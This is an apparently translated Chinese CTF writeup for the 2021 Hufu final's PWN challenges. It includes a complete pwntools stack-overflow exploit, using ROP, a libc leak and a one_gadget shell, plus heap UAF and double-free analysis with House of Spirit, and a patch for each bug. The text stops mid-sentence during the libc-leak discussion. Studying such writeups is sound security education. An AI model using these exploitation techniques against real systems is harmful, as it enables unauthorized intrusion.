# 2021虎符网络安全技能大赛决赛 PWN Writeup
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## jdt
一道简单的栈溢出 + 菜单题，难度主要在于结构分析上
###  程序一览
我们先还原一下结构信息
看一下菜单信息
只看菜单内容可能会以为这是一道堆题，但实际上并不是。
在修复完结构体的数据后，可以很快速的发现这里存在一个溢出，问题就在于判定范围的时候没有考虑到临界情况，从而导致了溢出0x50个字节。
这道题是存在canary的，但是我们并不需要考虑如何绕过canary，因为我们这里的溢出很特别，我们可以直接修改canary之后的内容来写ROP，就可以绕过canary的检测了。我们可以指定修改某一部分的内容。
###  防御
把所有的
    if(idx > 0x10)
换成
    if(idx > 0xF)
###  攻击
这里我泄露pie之后利用plt表中的printf来输出栈上的地址来泄露得到libc基址，接着二次利用one_gadget来getshell。
**EXP**
    from pwn import *
    r = process('./jdt')
    # r = remote('172.16.9.2', 9006)
    context.log_level = "debug"
    elf = ELF('./jdt')
    def debug(addr=0, PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(r.pid)).readlines()[1], 16)
            print ("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(r, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(r, "b *{}".format(hex(addr)))
    def choice(idx):
        r.sendlineafter("Choice: ", str(idx))
    def add(price=1, author="wjh", name="wjh", description="wjh"):
        choice(1)
        r.sendlineafter("Price?", str(price))
        r.sendafter("Author?", author)
        r.sendafter("name?", author)
        r.sendafter("Description?", description)
    def show(idx):
        choice(3)
        r.sendlineafter("idx?", str(idx))
    def edit(idx, content):
        choice(2)
        r.sendlineafter("idx?", str(idx))
        choice(3)  # Name
        r.send(content[:0x10])
        choice(2)
        r.sendlineafter("idx?", str(idx))
        choice(2)
        r.send(content[0x10:0x20])
        choice(2)
        r.sendlineafter("idx?", str(idx))
        choice(4)
        r.send(content[0x20:0x40])
    def exit_loop():
        choice(5)
    for i in range(16):
        add()
    show(16)
    r.recvuntil('Price:')
    pie_base = int(r.recvuntil('\n'), 10) - 0x8c0
    log.success("pie: " + hex(pie_base))
    elf.address = pie_base
    stack_addr = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    log.success("stack: " + hex(stack_addr))
    pop_rdi_addr = pie_base + 0x00000000000011e3
    main_addr = pie_base + 0x0000000000000AFA
    payload = 'b' * 8 + p64(pop_rdi_addr) + p64(stack_addr + 0x98) + p64(elf.plt['printf']) + p64(main_addr)
    edit(16, payload.ljust(0x40, '\x00'))
    exit_loop()
    # leak libc
    libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3da80b
    log.success("libc:" + hex(libc_base))
    one = [0x4527a, 0xf0364, 0xf1207]
    one_gadget = libc_base + one[0]
    #getshell
    for i in range(16):
        add()
    payload2 = 'b' * 8 + p64(one_gadget)
    edit(16, payload2.ljust(0x40, '\x00'))
    exit_loop()
    r.interactive()
## message
###  程序一览
**checksec**
保护全开
**程序内容**
这道题就是典型的glibc2.23下的菜单 +
堆题，只不过披上了C++的外壳，但是漏洞部分主要还是使用C的malloc函数和free函数所产生的，比赛的时候被C++所吓唬住了，所以比赛开始后很久才去仔细研究这道题，导致丢失了大量的分数。
这道题目由于是C++所编写的，伪代码中充斥着各种命名空间的信息，非常的长，所以为了方便分析，拿到题目后先在IDA中把结构体设置好。
###  分析漏洞
通过观察IDA左侧的Functions
window，我发现了malloc和free函数，所以我猜测这道题应该是一个堆题，而堆题的大部分漏洞都是存在于free函数附近的操作，所以我顺着菜单的信息来找到了
**Remove Message** 这个功能
我们可以发现这里在free之后，只对了pool[idx]进行置0，而没有对pool[idx]->message_ptr和pool[idx]->phone_ptr进行置0。而观察其他代码可以发现，程序对于某个index所指向的Message结构体是否有效的判定依赖于对
**pool[idx]是否为0的判定**
，如果为0则意味着这个Message结构体未被使用或被释放，由此我们可以想到，是否有一处地方可以把释放掉的Message结构体重新申请回来，使得
**pool[idx] != 0，**
而且此时这个结构体上有pool[idx]->message_ptr和pool[idx]->phone_ptr这两个残留指针，如果这两个残留指针没有被覆盖，我们就可以构成UAF或者double
free。
所以我把找漏洞的重心都放在了Add Message这里，发现了这里代码中存在问题，问题在于对Message
size检验不通过后，没有做对这块错误堆块结构的后续处理（free、置0等等），而是直接进入了下一次菜单逻辑，而且在这个过程中message_ptr的残留指针没有被覆盖。
这样就导致我们可以利用这个功能重新申请到之前被释放的Message结构（fastbins->0x30），并且这个结构上保留着已被释放的message_ptr的地址（phone的地址在这之前被覆盖，所以无法利用）。
###  防御
这道题的问题其实蛮多的，但是在比赛过程中，我们需要一种最快速的修复方法。这道题我在比赛中的修复方法是修复了在Remove
Message中的问题，在这个过程中没有把message_ptr的地址置0，我们只需要patch程序使其在Remove
Message的过程中把message_ptr的地址置0即可。
不过在在这部分的空间，远不足以让我们来把message_ptr的地址置0，我们需要有另一块地址来写入我们的汇编代码，然后让代码在执行过程中jmp过去执行即可。
在IDA中我们就可以发现 **.eh_frame** 这部分空间满足这个要求，并且这部分空间具有可执行权限，关于 **.eh_frame**
的介绍可以参照[https://stackoverflow.com/questions/26300819/why-gcc-compiled-c-program-needs-eh-frame-section](https://stackoverflow.com/questions/26300819/why-gcc-compiled-c-program-needs-eh-frame-section?fileGuid=hhycXd8TVTJjWhQh)
###  攻击
对于这道题来说，我认为防御是比较容易的，但是攻击较难。
**泄露堆地址**
利用fastbins链上的残余指针即可获得堆地址，不过需要注意一般操作会造成残余指针会覆盖，需要结合UAF的漏洞来泄露，具体操作可以看exp。
**构成UAF**
首先我们要想办法来构成UAF，根据上面的分析，我们只需要在free之后再申请回来并在程序中输入一个错误的message size即可构成UAF。
但是这个方法在实际过程中需要注意堆块的fd指针，因为这个位置同时也是message结构体的message_size的内容。
在edit
Message过程中，程序会根据message_size的大小来读取Message内容，而如果在fastbins只有一个堆块的时候取出这个堆块，那么就会使得fd
= 0，即message_size为0，这样就不能够构成UAF了。
所以我这里为了方便，直接用double free(a -> b -> a)这种方法来进行UAF，并控制fd指针。
###
**提升到任意内存读写**
通过上面的分析可以得知这道题是保护全开的，所以我们只能考虑修改fd到堆那篇区域的某个地方。而这个程序通过了一个Message结构体来储存其他堆块的指针，所以我们只需要修改fd到这个Message
结构体并劫持即可。
先在Message结构体之上伪造一个和要修改fd的堆块相近的size，我这里用的是0x71（为了绕过glibc对fastbin申请堆块时候的检测），然后修改fd指向到那里，这样就可以成功申请得到这个部分的Message结构体，同时我们就相当于得到了任意读写权限，因为那块地方存放了其他的堆块指针。这种操作似乎叫做
**House of Spirit** 。
**Leak libc**
但是拥有了任意读写之后，我们还是无处可打，正是因为我没有没有libc base
这道题的难点就在于如何leak